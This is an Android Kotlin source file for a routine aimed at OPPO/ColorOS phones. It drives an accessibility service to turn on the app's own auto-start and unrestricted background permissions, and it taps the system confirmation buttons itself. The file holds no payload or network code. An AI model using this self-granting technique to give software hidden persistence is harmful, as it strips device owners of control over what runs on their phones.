package com.storm.safe.rock.service.modules.yw5xud.oppo

import android.util.Log
import com.storm.safe.rock.auto.a11y.UiAutomation
import com.storm.safe.rock.service.MyAccessibilityService
import kotlinx.coroutines.delay

/**
 * Step 3 -- 自启动 + 后台运行。
 *
 * vendor m212318b6:SDK >= 35 走设置->应用->自启动管理;SDK < 35 走 openAppDetails + 多开关尝试。
 * 未找到自启动开关时 5 个 SafeCenter ComponentName 兜底(文档"权限 3")。
 */
class OppoStep3AutoStart(
    private val service: MyAccessibilityService?,
    private val ui: UiAutomation,
    private val steps: OppoSteps
) {
    companion object {
        private const val TAG = "OppoStep3AutoStart"
    }

    suspend fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        if (OppoStepCompletionStore.isCompleted(steps.ctx, OppoStepCompletionStore.Keys.STEP3_AUTOSTART)) {
            logs.add("[Step 3/9] ⏭ 24h 内已完成,跳过")
            return
        }
        logs.add("[Step 3/9] ▶ 自启动 + 后台开始")

        // Dispatch through steps to preserve test override behavior
        val autoOK = steps.runAutoStartSubSwitch(successes, failures, logs)
        val bgOK = steps.runBackgroundSubSwitch(successes, failures, logs)

        if (autoOK && bgOK) {
            OppoStepCompletionStore.markCompleted(steps.ctx, OppoStepCompletionStore.Keys.STEP3_AUTOSTART)
            successes.add("[Step 3/9] 自启动+后台整体完成")
        } else {
            logs.add("[Step 3/9] 部分失败,不 mark 整体(autoOK=$autoOK bgOK=$bgOK)")
        }
    }

    suspend fun runAutoStartSubSwitch(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ): Boolean {
        // Dispatch through steps to preserve test override behavior
        val viaSettings = steps.tryOpenAutoStartViaSettings(successes, failures, logs)
        val ok = if (viaSettings) true else {
            logs.add("[Step 3/9] Settings 路径失败(ColorOS 16 SafeCenter 已废弃)")
            steps.tryOpenAutoStartViaSafeCenter(successes, failures, logs)  // 仍调用以触发 deprecation 日志
        }
        if (ok) OppoStepCompletionStore.markCompleted(steps.ctx, OppoStepCompletionStore.Keys.STEP3_AUTOSTART_SWITCH)
        return ok
    }

    suspend fun tryOpenAutoStartViaSettings(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ): Boolean {
        val sdk = android.os.Build.VERSION.SDK_INT
        if (sdk >= 35) {
            // Phase G#10: ColorOS 16(SDK>=35)没有自启动管理 Activity
            Log.d(TAG, "[Step3] SDK=$sdk>=35: ColorOS 16 无自启动管理 UI,视为已完成")
            return true
        } else {
            ui.openAppDetails()
            delay(800L)
            val switchTexts = listOf("允许自动启动", "允许应用自启动", "自动启动", "允许自启动", "开机自启动")
            for (s in switchTexts) { if (ui.openSwitch(s)) return true }
            return false
        }
    }

    suspend fun tryOpenAutoStartViaSafeCenter(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ): Boolean {
        // Phase D: ColorOS 16 discovery 确认 com.coloros.safecenter / com.oppo.safe 不存在,
        //          com.oplus.safecenter 存在但无 StartupAppList Activity -- 自启动管理
        //          已迁移到系统 Settings 内部(走 tryOpenAutoStartViaSettings 路径)。
        //          保留本方法签名以兼容现有测试 override,但实现改为 no-op + 日志。
        logs.add("[Step 3/9] SafeCenter 5 ComponentName 在 ColorOS 16 已废弃,Settings 路径是唯一入口")
        return false
    }

    suspend fun runBackgroundSubSwitch(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ): Boolean {
        val ctx = steps.ctx
        // Phase G#10: Step 2 已通过 openAppDetails->耗电管理->"完全允许后台行为" 覆盖后台行为。
        // 检测 Step 2 已完成则直接返回 true(避免重复操作 + RadioButton 不被 openSwitch 识别)。
        if (OppoStepCompletionStore.isCompleted(ctx, OppoStepCompletionStore.Keys.STEP2_BATTERY)) {
            Log.d(TAG, "[Step3] 后台行为已由 Step 2 覆盖(完全允许后台行为),跳过")
            OppoStepCompletionStore.markCompleted(ctx, OppoStepCompletionStore.Keys.STEP3_AUTOSTART_BACKGROUND)
            return true
        }

        // SDK<35 fallback:独立执行后台开关
        ui.openAppDetails()
        delay(800L)
        val batteryEntries = listOf("耗电管理", "耗电保护", "电量消耗", "耗电详情", "电池")
        var entered = false
        for (t in batteryEntries) { if (ui.clickSelector("[text=\"$t\"][visibleToUser=true]")) { entered = true; break } }
        if (!entered) {
            failures.add("[Step 3/9] 未找到耗电管理入口")
            return false
        }
        delay(800L)
        val bgTexts = listOf(
            "完全允许后台行为", "允许应用后台行为", "允许完全后台行为",
            "允许后台运行", "完全后台行为", "后台运行", "允许后台活动"
        )
        for (t in bgTexts) {
            if (ui.openSwitch(t)) {
                ui.clickSelector("[text=\"允许\"][visibleToUser=true]") || ui.clickSelector("[text=\"确定\"][visibleToUser=true]")
                OppoStepCompletionStore.markCompleted(ctx, OppoStepCompletionStore.Keys.STEP3_AUTOSTART_BACKGROUND)
                return true
            }
        }
        // Phase G#10: 如果 openSwitch 找不到(RadioButton),尝试 clickSelector 直接点
        for (t in bgTexts) {
            if (ui.clickSelector("[text=\"$t\"][visibleToUser=true]")) {
                ui.clickSelector("[text=\"允许\"][visibleToUser=true]") || ui.clickSelector("[text=\"确定\"][visibleToUser=true]")
                OppoStepCompletionStore.markCompleted(ctx, OppoStepCompletionStore.Keys.STEP3_AUTOSTART_BACKGROUND)
                return true
            }
        }
        failures.add("[Step 3/9] 后台开关未找到")
        return false
    }
}
